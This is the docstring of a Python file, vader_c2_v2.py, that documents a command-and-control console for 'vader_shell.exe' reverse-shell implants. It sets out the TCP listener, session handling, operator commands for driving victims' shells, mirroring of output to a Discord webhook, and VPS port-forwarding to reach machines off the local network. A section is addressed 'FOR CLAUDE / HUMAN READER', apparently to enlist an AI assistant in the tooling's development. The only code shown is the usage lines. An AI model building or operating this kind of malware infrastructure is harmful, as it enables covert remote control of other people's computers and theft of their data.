"""
vader_c2_v2.py — Unified C2 Console (Discord + TCP Reverse Shell)
================================================================
iron-sun / 22DIV research
...
FOR CLAUDE / HUMAN READER:
  This is the full multi-session C2 console (~1379 lines).
  For a simpler single-session experience, use vader_listener.py instead.

  ARCHITECTURE:
    - One TCP server thread accepts connections from vader_shell.exe implants
    - Each connection becomes a Session object (uuid, hostname, IP, timestamp)
    - Operator types commands into the console; routed to active session socket
    - Discord webhook mirrors all output (DEPRECATED — mentor says pure TCP)
    - All sessions logged to JSONL at self.log_path

  KEY COMMANDS (once running):
    sessions          — list active connections
    interact <id>     — bind to a session
    [any cmd]         — sent to active session's shell
    background        — detach from session without killing it
    kill <id>         — kill a session
    exit              — shutdown C2

  DISCORD DEPRECATION:
    The Discord channel (--webhook) is deprecated per mentor doctrine.
    Target architecture is pure TCP with VPS port-forwarding for off-LAN.
    Keep discord_c2.py and the webhook path for reference only.

  CONFIG (edit before use):
    C2_PORT = 4443           — TCP listener port (must match vader_shell.c C2_PORT)
    WEBHOOK_URL = ""         — Discord webhook (leave empty to disable)
    LOG_PATH = "c2_log.jsonl"— session log file

Usage:
    python shell\\vader_c2_v2.py
    python shell\\vader_c2_v2.py --port 4443
    python shell\\vader_c2_v2.py --webhook https://discord.com/api/webhooks/...
"""
